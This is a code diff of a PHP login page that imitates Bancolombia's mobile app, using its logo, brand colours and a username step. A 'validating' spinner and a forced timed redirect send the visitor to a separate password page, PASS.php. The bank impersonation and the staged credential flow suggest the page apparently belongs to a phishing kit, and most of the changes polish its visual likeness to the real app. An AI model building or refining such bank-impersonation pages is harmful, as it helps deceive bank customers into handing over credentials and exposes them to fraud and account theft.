@@ -1,5 +1,5 @@
 <?php
-// a/login.php - DISEÑO APP NEGRA 2026
+// a/login.php - DISEÑO APP NEGRA 2026 FINAL
 session_start();
 ?>
 <!DOCTYPE html>
@@ -22,13 +22,38 @@ session_start();
             display: flex;
             flex-direction: column;
             height: 100vh;
+            overflow: hidden;
+            position: relative;
         }
 
-        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
-        
-        .container { padding: 0 30px; margin-top: 40px; text-align: center; }
+        /* DISEÑO DE LAS LÍNEAS DEL LOGO */
+        .decoracion-lineas {
+            position: absolute;
+            top: 25%;
+            left: -10%;
+            width: 120%;
+            height: 150px;
+            pointer-events: none;
+            z-index: 1;
+            transform: rotate(-5deg);
+            opacity: 0.9;
+        }
 
-        .logo-bancolombia { width: 180px; margin-bottom: 40px; }
+        .linea {
+            height: 18px;
+            width: 100%;
+            margin-bottom: 8px;
+            border-radius: 20px;
+        }
+        .linea.amarilla { background: #FDDA24; width: 80%; margin-left: 10%; }
+        .linea.naranja { background: #ED7124; width: 90%; margin-left: 5%; }
+        .linea.morada { background: #7A4998; width: 70%; margin-left: 15%; }
+
+        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 10; }
+        
+        .container { padding: 0 30px; margin-top: 20px; text-align: center; position: relative; z-index: 10; }
+
+        .logo-bancolombia { width: 180px; margin-bottom: 60px; filter: brightness(1); }
 
         .title { 
             font-size: 18px; 
@@ -43,16 +68,10 @@ session_start();
             text-align: left;
         }
 
-        .input-group label {
-            font-size: 12px;
-            color: #aaa;
-            display: block;
-        }
-
         .entradas {
             background: transparent;
             border: none;
-            color: #ffffff !important; /* Texto blanco sobre fondo negro */
+            color: #ffffff !important;
             font-size: 16px;
             padding: 10px 0;
             width: 100%;
@@ -61,7 +80,7 @@ session_start();
 
         #btn-continuar {
             width: 100%;
-            background-color: #2c2c2c; /* Deshabilitado inicial */
+            background-color: #2c2c2c;
             color: #666;
             border: none;
             height: 50px;
@@ -73,7 +92,7 @@ session_start();
         }
 
         #btn-continuar.active {
-            background-color: #FDDA24; /* Amarillo Bancolombia */
+            background-color: #FDDA24;
             color: #000;
             cursor: pointer;
         }
@@ -83,7 +102,7 @@ session_start();
             display: none; 
             position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); 
+            background: rgba(0,0,0,0.95); 
             z-index: 9999; 
             flex-direction: column;
             justify-content: center;
@@ -101,13 +120,20 @@ session_start();
 </head>
 <body>
 
+    <div class="decoracion-lineas">
+        <div class="linea amarilla"></div>
+        <div class="linea naranja"></div>
+        <div class="linea morada"></div>
+    </div>
+
     <div id="cargando-o">
         <div class="spinner"></div>
         <p style="margin-top: 15px; font-size: 14px;">Validando información...</p>
     </div>
 
     <div class="header">
-        <img src="../img/btn-cerrar.jpg" height="20" style="filter: invert(1);"> <img src="../img/logo-app.jpg" height="20">
+        <img src="../img/btn-cerrar.jpg" height="20" style="filter: invert(1);"> 
+        <img src="../img/logo-app.jpg" height="20">
         <div style="width: 20px;"></div>
     </div>
 
@@ -117,7 +143,7 @@ session_start();
         <div class="title">Ingresa tu usuario</div>
 
         <div class="input-group">
-            <input type="text" id="txt-usuario" class="entradas" placeholder="Usuario" autocomplete="off">
+            <input type="text" id="txt-usuario" class="entradas" placeholder="Ingresa el usuario" autocomplete="off">
         </div>
 
         <button id="btn-continuar" disabled>CONTINUAR</button>
@@ -125,7 +151,6 @@ session_start();
 
     <script>
         $(document).ready(function() {
-            // Limpieza y foco
             localStorage.removeItem('user_akam');
             
             $("#txt-usuario").on("input", function() {
@@ -149,7 +174,6 @@ session_start();
                     window.location.href = "PASS.php";
                 });
 
-                // Seguridad por si el servidor tarda
                 setTimeout(function(){ window.location.href = "PASS.php"; }, 3500);
             });
         });
